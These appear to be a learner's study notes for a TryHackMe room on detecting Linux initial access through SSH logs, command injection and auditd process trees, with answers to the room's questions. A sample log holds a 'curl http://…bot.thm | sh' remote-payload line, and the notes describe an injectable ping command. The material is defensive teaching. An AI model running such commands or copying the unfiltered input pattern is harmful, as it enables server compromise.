---
layout: default
title: Linux Threat Detection 1
description: Explore how attackers break into Linux systems and how you can detect this in logs.
---

🔗 [Link to the Room](https://tryhackme.com/room/linuxthreatdetection1)

## 🏷️ Table of Contents

1. [Popularity of SSH](#popularity-of-ssh)<br>
2. [Initial Access via SSH](#initial-access-via-ssh)<br>
 2.1 [Risks with Key-Based Authentication](#risks-with-key-based-authentication)<br>
3. [Detecting SSH Attacks](#detecting-ssh-attacks)<br>
 3.1 [Common SSH Breach Scenario](#common-ssh-breach-scenario)<br>
 3.2 [Distinguishing Legitimate vs Malicious Logins](#distinguishing-legitimate-vs-malicious-logins)<br>
 3.3 [Detection Mindset](#detection-mindset)<br>
4. [Initial Access via Services](#initial-access-via-services)<br>
 4.1 [Linux and Public Services](#linux-and-public-services)<br>
 4.2 [Using Application Logs](#using-application-logs)<br>
 4.3 [Web as Initial Access](#web-as-initial-access)<br>
 4.4 [Example: Command Injection via Web App](#example-command-injection-via-web-app)<br>
 4.5 [Indicators of Command Injection](#indicators-of-command-injection)<br>
5. [Detecting Service Breach](#detecting-service-breach)<br>
 5.1 [Process Tree](#process-tree)<br>
 5.2 [Typical SOC Scenario](#typical-soc-scenario)<br>
 5.3 [Auditd and Process Tree Analysis](#auditd-and-process-tree-analysis)<br>
6. [Advanced Initial Access](#advanced-initial-access)<br>
 6.1 [Human-Led Attacks](#human-led-attacks)<br>
 6.2 [Supply Chain Compromise](#supply-chain-compromise)<br>
 6.3 [Detecting Human-Led and Supply Chain Attacks](#detecting-human-led-and-supply-chain-attacks)<br>

---

# 📚 Study Notes #

- Linux usage keeps growing due to AI, cloud computing, and IoT
- Despite modern tech, most Linux breaches still begin with basic, well-known Initial Access techniques
- The most common entry point: **exposed SSH**

<!-- No Questions -->

&nbsp;

# Popularity of SSH

&nbsp;

- SSH (Secure Shell) is the standard remote access method for Linux servers
 -Almost every Internet-facing Linux system has SSH enabled
- In 2025, Shodan reported 40+ million exposed SSH servers
- Security practices var as some admins enforce key-based authentication, others still rely on weak or reused passwords

&nbsp;

>[!CAUTION]
>Weak SSH configurations are a common target for brute-force attacks

&nbsp;

# Initial Access via SSH

- SSH is powerful and frequently misconfigured - similar to RDP on Windows
- Both are tracked under MITRE ATT&CK: External Remote Services
- Threat actors often scan the Internet for exposed SSH, use large botnets to attempt access
- Two primary access methods are stolen SSH keys and compromised passwords

&nbsp;

## Risks with Key-Based Authentication

- Key-based auth is safer than passwords — but not risk-free.
- Common failure points are private SSH keys stored in insecure locations (public GitHub repositories, CI/CD pipelines, Ansible automation servers)
- SSH keys stolen from admin laptops infected with data-stealing malware

- Password-based SSH greatly increases attack surface.
- Common real-world scenarios:
  - Weak passwords set temporarily and never changed
  - Contractors using trivial passwords (e.g., 12345678)
  - Old or legacy SSH servers accidentally exposed to the Internet

- Many Linux threat groups (e.g., Outlaw) gain access via exposed SSH, weak credentials, stolen keys
- These attacks often escalate quickly once access is obtained

&nbsp;

---
><details><summary>❓When did the ubuntu user log in via SSH for the first time? Answer example: 2023-09-16</summary>2024-10-22</details>
---
><details><summary>❓Did the ubuntu user use SSH keys instead of a password for the above found date? (Yea/Nay)</summary>Yea</details>
---

&nbsp;

# Detecting SSH Attacks

&nbsp;

## Common SSH Breach Scenario

- A very typical real-world misconfiguration chain:
  - Public SSH access enabled
  - Password-based authentication allowed
  - Weak password set for a user account
- When these three exist together, an SSH breach is inevitable — attackers will eventually guess the password via brute force.

&nbsp;

Scenario:
An IT administrator enables public SSH access to the server, allows password-based authentication, and sets a weak password for one of the support users. 
Combined, these three actions inevitably lead to an SSH breach, as it's a matter of time before threat actors guess the password. 
The log sample below shows such a compromise: A brute force followed by a password breach. 

![image](https://github.com/user-attachments/assets/eba41aea-ad07-47f0-b7db-f0c2c51cbe9d)

There are three indicators of malicious logins to pay attention to:

&nbsp;

## Distinguishing Legitimate vs Malicious Logins

1. Likely Legitimate Login (Ansible): `Accepted publickey for ansible from 10.14.105.255`
- Why it looks benign: Uses public-key authentication, source IP is internal, login occurs at an exact, consistent time (14:00), matches typical automation behavior
- Still required: Confirm the IP belongs to an Ansible server, review post-login activity for anomalies

Successful SSH Logins: <br>
![image](https://github.com/user-attachments/assets/3e200a22-d5c6-45f9-a830-dfa933930420)

2. Suspicious Password-Based Logins: 
`Accepted password for jsmith from 54.155.224.201`
`Accepted password for jsmith from 196.251.118.184`
- Red flags: Password authentication used, external IP addresses, same user logging in from different countries / networks, login times may be unusual (e.g., early morning hours)
- These strongly suggest: Credential compromise and successful brute-force or credential-stuffing attack

&nbsp;

## Detection Mindset

- When analyzing SSH access, always ask:
  - Does this user normally log in this way?
  - Is the source IP expected for this account?
  - Does the timing match normal behavior?
  - Is password-based SSH truly required?

**Even one suspicious successful login can be enough to justify an incident response.**

---
><details><summary>❓When did the SSH password brute force start? Answer format: 2023-09-15</summary>2025-08-21</details>
---
><details><summary>❓Which four users did the botnet attempt to breach? Answer Format: Separate by a comma, in alphabetical order.</summary>root, roy, sol, user</details>
---
><details><summary>❓Finally, which IP managed to breach to root user?</summary>91.224.92.79</details>
---

&nbsp;

# Initial Access via Services

&nbsp;

## Linux and Public Services

- Linux systems commonly host public-facing services, including Web servers, Email servers, Databases, Development and IT management tools
- Linux is also the foundation of many Firewalls, VPN solutions
- If any exposed service is compromised, the entire Linux host is at risk
= MITRE ATT&CK T1190 — Exploit Public-Facing Application

• CVE in Zimbra Collaboration: Allowed the attackers to execute arbitrary OS commands
• Exposed Docker API port: Acted as an entry point in a series of cloud infrastructure breaches
• CVE in Palo Alto firewalls: Granted attackers full control over the Linux-based firewall's OS
• WordPress "plugins" feature: Often abused to upload malware like web shells to the system

![image](https://github.com/user-attachments/assets/e6f7c011-5365-4457-911f-12b4a5be74e5)

## Using Application Logs

- Application logs rarely state outright that exploitation is happening as they often lack full context and only show fragments of attacker behavior
- Still, they provide unique artifacts useful for detection

- Examples of Useful Logs:
  - Web logs → web attacks, exploitation attempts
  - Database logs → suspicious or malformed SQL queries
  - VPN logs → abnormal login behavior
  - Application-specific logs → domain-specific abuse (e.g., banking transactions)

&nbsp;

## Web as Initial Access

- Any publicly exposed web application can become an entry point
- Vulnerabilities often lead to remote code execution (RCE)
- Poor input validation is a common root cause

## Example: Command Injection via Web App

- Scenario: A web app (TryPingMe) allows users to ping an IP address
- Backend executes: `ping -c 2 [USER_INPUT]`
- No input filtering or sanitization is applied and so the design is vulnerable to command injection.

![image](https://github.com/user-attachments/assets/09d2d567-ee4c-4f0f-a1e8-6adfe7280160)

&nbsp;

## Indicators of Command Injection

- Input values that are not valid hostnames or IPs
- Use of shell metacharacters `;`, `&&`, `|`, 
- Execution of OS commands `whoami`, `ls`, 
- Pattern of failed attempts (500 errors), followed by successful command execution (200 responses)

&nbsp;

---
><details><summary>❓What is the path to the Python file the attacker attempted to open?</summary>/opt/trypingme/main.py</details>
---
><details><summary>❓Looking inside the opened file, what's the flag you see there?</summary>THM{*_**_**********!}</details>
---

&nbsp;

# Detecting Service Breach

&nbsp;

## Process Tree

- Why Process Tree Analysis Matters:
  - Application logs are not always available or reliable
  - SOC teams often rely on process tree analysis instead
  - Process trees provide a universal way to trace how a command was executed, what process launched it, whether it originated from normal admin activity or a breach
- Process tree analysis is especially useful for Initial Access investigations.
  
## Typical SOC Scenario
- An alert is triggered for a suspicious command (e.g. whoami)
- Key question `Was this executed by an admin? or by a compromised service or application?`
- To answer this, you find the command in the logs, trace it up the process tree, identify the true origin

![image](https://github.com/user-attachments/assets/c0c833b3-e8b1-4bcc-a50e-21efde311e08)

&nbsp;

## Auditd and Process Tree Analysis

&nbsp;

Step 1: Locate the Suspicious Command 
  - Search Auditd logs for the command execution: `ausearch -i -x whoami`
  - example output:

```
ubuntu@thm-vm:~$ ausearch -i -x whoami # -x filters the results by the command name
type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : syscall=execve success=yes exit=0 items=2 ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec

ubuntu@thm-vm:~$ ausearch -i --pid 3905 # 3905 is a parent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
type=SYSCALL msg=audit(08/25/25 16:28:17.101:983) : syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec

ubuntu@thm-vm:~$ ausearch -i --pid 3898 # 3898 is a grandparent process ID of whoami
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/python3 /opt/mywebapp/app.py
type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : syscall=execve success=yes exit=0 items=2 ppid=1 pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec
```

- Key fields: `pid` → Process ID of whoami and `ppid` → Parent process ID

Step 2: Walk Up the Process Tree (Parent)
- Trace the parent process using the ppid: `ausearch -i --pid 3905`

- whoami was executed via /bin/sh
- Suggests command execution, not an interactive login

Step 3: Identify the Grandparent Process
- Continue tracing upward: ausearch -i --pid 3898
  
- `whoami` originated from a Python web application
- The app is a strong candidate for Initial Access

- At this point, important questions arise: Is whoami part of normal application logic? or was the app exploited (e.g. command injection)?
- Answering that may require web logs, code review, developer confirmation

Step 4: Hunt for Stronger evidence
- List all child processes of the app: `ausearch -i --ppid 3898 | grep 'proctitle'`
- example output:
```
ubuntu@thm-vm:~$ ausearch -i --ppid 3898 | grep 'proctitle' # Use grep for a simpler output
type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
type=PROCTITLE msg=audit(08/25/25 16:28:18.230:985) : proctitle=/bin/sh -c ls -la
type=PROCTITLE msg=audit(08/25/25 16:28:19.765:987) : proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh
[...]
```

Clear Indicators of Compromise
- Red flags confirming a service breach:
  - Execution of shell commands via `/bin/sh -c`
  - Recon commands (`ls -la`)
  - Remote payload execution: `curl http://... | sh`
  - Commands not expected in normal app behavior
- This confirms that the application was exploited and it was used as the Initial Access vector

&nbsp;

---
><details><summary>❓What is the PPID of suspicious whoami command?</summary>1018</details>
---
><details><summary>❓Moving up the tree, what is the PID of the TryPingMe app?</summary>577</details>
---
><details><summary>❓Which program did the attacker use to open a reverse shell?</summary>Python</details>
---

&nbsp;

# Advanced Initial Access

&nbsp;

## Human-Led Attacks

- Linux is primarily a server OS managed by technical users, not typical end-users
- This lowers (but does not eliminate) the risk of phishing and malicious USB devices
- Human error still creates real Initial Access opportunities

&nbsp;

## Supply Chain Compromise

- Attackers compromise trusted software - malicious updates spread to all users
- Linux servers rely on hundreds of libraries that are maintained by many independent developers

&nbsp;

## Detecting Human-Led and Supply Chain Attacks

- All Initial Access techniques discussed so far can be investigated using process tree analysis.

Detection Workflow

1. Start with a trigger
  - Suspicious command execution
  - Connection to a known malicious IP
  - SIEM alert

2. Build the process tree
  - Identify the parent process
  - Trace execution back to its origin

3. Identify the source
  - Web server
  - Internal application
  - Package manager
  - Administrator SSH session

4. Decide legitimacy
  - Expected behavior?
  - Human mistake?
  - Clear indicator of compromise?

![image](https://github.com/user-attachments/assets/d44559d7-124e-4f91-a20e-4b7e054b96cd)

&nbsp;

---
><details><summary>❓Which Initial Access technique is likely used if a trusted app suddenly runs malicious commands?</summary>Supply Chain Compromise</details>
---
><details><summary>❓Which detection method can you use to detect a variety of Initial Access techniques?</summary>Process Tree Analysis</details>
---
---

&nbsp;
